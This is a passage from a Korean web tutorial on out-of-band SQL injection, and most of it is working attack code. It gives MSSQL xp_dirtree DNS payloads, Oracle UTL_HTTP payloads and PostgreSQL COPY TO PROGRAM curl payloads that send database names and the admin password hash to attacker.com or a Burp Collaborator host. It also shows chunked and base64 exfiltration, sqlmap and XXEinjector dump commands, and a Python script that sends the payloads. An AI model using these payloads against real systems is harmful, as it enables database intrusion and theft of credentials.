<p><strong>Burp Collaborator 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">webapp.abc123xyz.burpcollaborator.net</span><br></span></code></pre></div></div>
<p>→ DB 이름: <strong>webapp</strong></p>
<p><strong>3. 테이블 목록 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @tbl VARCHAR(1024); SET @tbl=(SELECT TOP 1 name FROM sys.tables); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@tbl+&#x27;.abc123xyz.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">users.abc123xyz.burpcollaborator.net</span><br></span></code></pre></div></div>
<p><strong>4. 사용자 비밀번호 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; DECLARE @pass VARCHAR(1024); SET @pass=(SELECT TOP 1 password FROM users WHERE username=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@pass+&#x27;.abc123xyz.burpcollaborator.net\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882cf99.abc123xyz.burpcollaborator.net</span><br></span></code></pre></div></div>
<p>→ 비밀번호 해시: <code>5f4dcc3b5aa765d61d8327deb882cf99</code></p>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="oracle-예시">Oracle 예시<a href="#oracle-예시" class="hash-link" aria-label="Direct link to Oracle 예시" title="Direct link to Oracle 예시" translate="no">​</a></h4>
<p><strong>1. HTTP 요청 테스트</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/test&#x27;)=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /test HTTP/1.1</span><br></span></code></pre></div></div>
<p><strong>2. 데이터베이스 이름 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?db=&#x27;||(SELECT ora_database_name FROM dual))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /?db=ORCL HTTP/1.1</span><br></span></code></pre></div></div>
<p><strong>3. 비밀번호 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?pass=&#x27;||(SELECT password FROM users WHERE username=&#x27;admin&#x27;))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /?pass=5f4dcc3b5aa765d61d8327deb882cf99 HTTP/1.1</span><br></span></code></pre></div></div>
<hr>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="postgresql-예시">PostgreSQL 예시<a href="#postgresql-예시" class="hash-link" aria-label="Direct link to PostgreSQL 예시" title="Direct link to PostgreSQL 예시" translate="no">​</a></h4>
<p><strong>1. COPY TO PROGRAM으로 데이터 전송</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT version()) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?data=$(cat)&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 서버 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">GET /?data=PostgreSQL 13.3 HTTP/1.1</span><br></span></code></pre></div></div>
<p><strong>2. 비밀번호 추출</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;; COPY (SELECT password FROM users WHERE username=&#x27;</span><span class="token plain">admin</span><span class="token string" style="color:#e3116c">&#x27;) TO PROGRAM &#x27;</span><span class="token plain">curl http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?pass=$(cat)&#x27;--</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="단계-3-데이터-정제-및-디코딩">단계 3: 데이터 정제 및 디코딩<a href="#단계-3-데이터-정제-및-디코딩" class="hash-link" aria-label="Direct link to 단계 3: 데이터 정제 및 디코딩" title="Direct link to 단계 3: 데이터 정제 및 디코딩" translate="no">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="긴-데이터-분할-전송">긴 데이터 분할 전송<a href="#긴-데이터-분할-전송" class="hash-link" aria-label="Direct link to 긴 데이터 분할 전송" title="Direct link to 긴 데이터 분할 전송" translate="no">​</a></h4>
<p>DNS는 <strong>라벨당 63자, 전체 253자</strong> 제한:</p>
<p><strong>MSSQL - 데이터 분할</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 1-30번째 문자</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(30); SET @data=(SELECT SUBSTRING(password, 1, 30) FROM users WHERE id=1); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.1.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 31-60번째 문자</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(30); SET @data=(SELECT SUBSTRING(password, 31, 30) FROM users WHERE id=1); EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.2.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>DNS 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">5f4dcc3b5aa765d61d8327deb882.1.attacker.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cf99.2.attacker.com</span><br></span></code></pre></div></div>
<p>합치기: <code>5f4dcc3b5aa765d61d8327deb882cf99</code></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="base64-인코딩">Base64 인코딩<a href="#base64-인코딩" class="hash-link" aria-label="Direct link to Base64 인코딩" title="Direct link to Base64 인코딩" translate="no">​</a></h4>
<p>특수문자 문제 해결:</p>
<p><strong>Oracle</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; AND UTL_HTTP.REQUEST(&#x27;</span><span class="token plain">http:</span><span class="token comment" style="color:#999988;font-style:italic">//attacker.com/?data=&#x27;||UTL_RAW.CAST_TO_VARCHAR2(UTL_ENCODE.BASE64_ENCODE(UTL_RAW.CAST_TO_RAW((SELECT password FROM users WHERE username=&#x27;admin&#x27;)))))=&#x27;1&#x27;--</span><br></span></code></pre></div></div>
<p><strong>공격자 측 디코딩</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">echo &quot;NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk=&quot; | base64 -d</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 출력: 5f4dcc3b5aa765d61d8327deb882cf99</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="자동화-도구-automated-tools">자동화 도구 (Automated Tools)<a href="#자동화-도구-automated-tools" class="hash-link" aria-label="Direct link to 자동화 도구 (Automated Tools)" title="Direct link to 자동화 도구 (Automated Tools)" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="sqlmap---out-of-band">SQLMap - Out-of-Band<a href="#sqlmap---out-of-band" class="hash-link" aria-label="Direct link to SQLMap - Out-of-Band" title="Direct link to SQLMap - Out-of-Band" translate="no">​</a></h3>
<p>SQLMap은 <strong>MSSQL과 Oracle</strong>에서 OOB 자동 지원:</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="기본-oob-스캔">기본 OOB 스캔<a href="#기본-oob-스캔" class="hash-link" aria-label="Direct link to 기본 OOB 스캔" title="Direct link to 기본 OOB 스캔" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/product?id=1&quot; --technique=T --dns-domain=attacker.com</span><br></span></code></pre></div></div>
<p><strong>MSSQL 예시</strong>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;http://example.com/product?id=1&quot; \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --dbms=mssql \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --dns-domain=abc123.burpcollaborator.net \</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    --batch</span><br></span></code></pre></div></div>
<p><strong>출력</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">[INFO] testing &#x27;Microsoft SQL Server/Sybase out-of-band&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[INFO] GET parameter &#x27;id&#x27; appears to be &#x27;Microsoft SQL Server/Sybase out-of-band&#x27; injectable</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="데이터-추출">데이터 추출<a href="#데이터-추출" class="hash-link" aria-label="Direct link to 데이터 추출" title="Direct link to 데이터 추출" translate="no">​</a></h4>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain"># 현재 DB</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com --current-db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 테이블 목록</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com -D webapp --tables</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># 데이터 덤프</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">sqlmap -u &quot;URL&quot; --dns-domain=attacker.com -D webapp -T users --dump</span><br></span></code></pre></div></div>
<p><strong>장점</strong>: Time-based보다 <strong>10배 이상 빠름</strong></p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="xxeinjector-xxe--oob">XXEinjector (XXE + OOB)<a href="#xxeinjector-xxe--oob" class="hash-link" aria-label="Direct link to XXEinjector (XXE + OOB)" title="Direct link to XXEinjector (XXE + OOB)" translate="no">​</a></h3>
<p>XXE와 결합한 OOB:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git clone https://github.com/enjoiz/XXEinjector.git</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cd XXEinjector</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"># OOB 공격</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --oob=http</span><br></span></code></pre></div></div>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="oob-sqli-helper-scripts">OOB-SQLi Helper Scripts<a href="#oob-sqli-helper-scripts" class="hash-link" aria-label="Direct link to OOB-SQLi Helper Scripts" title="Direct link to OOB-SQLi Helper Scripts" translate="no">​</a></h3>
<p><strong>Python 자동화 스크립트</strong>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> requests</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> time</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">import</span><span class="token plain"> base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># Burp Collaborator 도메인</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">COLLAB_DOMAIN </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;abc123xyz.burpcollaborator.net&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">URL </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;http://example.com/product?id=1&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">extract_data_dns</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">query</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;DNS를 통한 데이터 추출&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27;; DECLARE @data VARCHAR(1024); SET @data=(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">query</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">); EXEC(&#x27;xp_dirtree \&quot;\\\\&#x27;+@data+&#x27;.</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">COLLAB_DOMAIN</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">\\a\&quot;&#x27;)--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">URL </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[*] Payload sent. Check Burp Collaborator for DNS query.&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[*] Expected format: &lt;data&gt;.</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">COLLAB_DOMAIN</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">def</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">extract_data_http</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">query</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:#e3116c">&quot;&quot;&quot;HTTP를 통한 데이터 추출 (Oracle)&quot;&quot;&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:#e3116c">f&quot;&#x27; AND UTL_HTTP.REQUEST(&#x27;http://</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">COLLAB_DOMAIN</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">/?data=&#x27;||(</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">{</span><span class="token string-interpolation interpolation">query</span><span class="token string-interpolation interpolation punctuation" style="color:#393A34">}</span><span class="token string-interpolation string" style="color:#e3116c">))=&#x27;1&#x27;--&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    r </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> requests</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">URL </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> payload</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">print</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string-interpolation string" style="color:#e3116c">f&quot;[*] Payload sent. Check HTTP server logs.&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 사용 예시</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extract_data_dns</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT DB_NAME()&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">extract_data_http</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;SELECT ora_database_name FROM dual&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="고급-기법">고급 기법<a href="#고급-기법" class="hash-link" aria-label="Direct link to 고급 기법" title="Direct link to 고급 기법" translate="no">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1-다단계-oob-multi-step">1. 다단계 OOB (Multi-Step)<a href="#1-다단계-oob-multi-step" class="hash-link" aria-label="Direct link to 1. 다단계 OOB (Multi-Step)" title="Direct link to 1. 다단계 OOB (Multi-Step)" translate="no">​</a></h3>
<p><strong>여러 데이터를 한 번에</strong>:</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># MSSQL - 데이터베이스 + 사용자 조합</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27;; DECLARE @data VARCHAR(1024);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">SET @data=(SELECT DB_NAME() + &#x27;</span><span class="token operator" style="color:#393A34">-</span><span class="token string" style="color:#e3116c">&#x27; + SYSTEM_USER);</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">EXEC(&#x27;</span><span class="token plain">xp_dirtree </span><span class="token string" style="color:#e3116c">&quot;\\&#x27;+@data+&#x27;.attacker.com\a&quot;</span><span class="token plain">&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--</span><br></span></code></pre></div></div>
<p><strong>DNS 로그</strong>:</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">webapp-sa.attacker.com</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2-oob--xxe-결합">2. OOB + XXE 결합<a href="#2-oob--xxe-결합" class="hash-link" aria-label="Direct link to 2. OOB + XXE 결합" title="Direct link to 2. OOB + XXE 결합" translate="no">​</a></h3>
<p><strong>XML External Entity와 결합</strong>:</p>
